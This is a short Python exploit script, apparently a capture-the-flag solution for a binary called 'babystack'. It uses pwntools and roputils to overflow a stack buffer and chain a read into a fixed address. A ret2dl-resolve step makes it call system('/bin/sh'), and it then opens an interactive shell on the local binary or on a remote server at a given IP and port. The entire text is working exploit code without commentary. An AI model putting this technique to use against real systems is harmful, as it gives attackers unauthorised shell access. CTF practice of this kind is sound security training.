#!/usr/bin/python

from pwn import *
import roputils

def exploit():
	target = 0x804a500
	payload = 'a'*0x10
	payload += p32(target)
	payload += rop.call("read",0,target,0x100)
	payload += rop.dl_resolve_call(target+0x50,target)
	payload = payload.ljust(0x100,'\x00')
	r.send(payload)

	payload = "/bin/sh\x00"
	payload = payload.ljust(0x50,'\x00')
	payload += rop.dl_resolve_data(target+0x50,"system")
	payload = payload.ljust(0x100,'\x00')
	r.send(payload)
	r.interactive()

exe = ELF("./babystack")
rop = roputils.ROP("./babystack")

if len(sys.argv) < 2:
	r = gdb.debug([exe.path],gdbscript="""
		b *0x8048483
		c
	""")
else:
	r = remote("128.199.101.63",11111)

exploit()